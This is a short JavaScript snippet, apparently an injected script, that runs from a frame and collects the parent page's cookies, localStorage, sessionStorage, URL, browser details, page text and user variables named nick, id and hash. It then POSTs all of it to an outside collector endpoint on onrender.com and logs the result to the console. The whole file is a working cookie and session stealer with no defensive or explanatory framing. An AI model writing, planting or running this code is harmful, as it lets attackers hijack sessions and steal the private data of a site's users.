(function () {
  const dados = {
    timestamp: new Date().toISOString(),
    url: parent.location.href,
    referrer: parent.document.referrer,
    userAgent: parent.navigator.userAgent,
    platform: parent.navigator.platform,
    language: parent.navigator.language,
    cookies: parent.document.cookie,
    localStorage: { ...parent.localStorage },
    sessionStorage: { ...parent.sessionStorage },
    screen: {
      width: parent.screen.width,
      height: parent.screen.height,
      colorDepth: parent.screen.colorDepth,
    },
    domDump: parent.document.body.innerText.slice(0, 5000),
    nick: typeof parent.nick !== 'undefined' ? parent.nick : null,
    userId: typeof parent.id !== 'undefined' ? parent.id : null,
    userHash: typeof parent.hash !== 'undefined' ? parent.hash : null,
    pagina: typeof parent.pagina !== 'undefined' ? parent.pagina : null
  };

  fetch("https://alanvxn2.onrender.com/coletor", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(dados)
  }).then(() => {
    parent.console.log('[✅ Dados enviados com sucesso]');
  }).catch(err => {
    parent.console.warn('[❌ Falha ao enviar dados]', err);
  });
})();
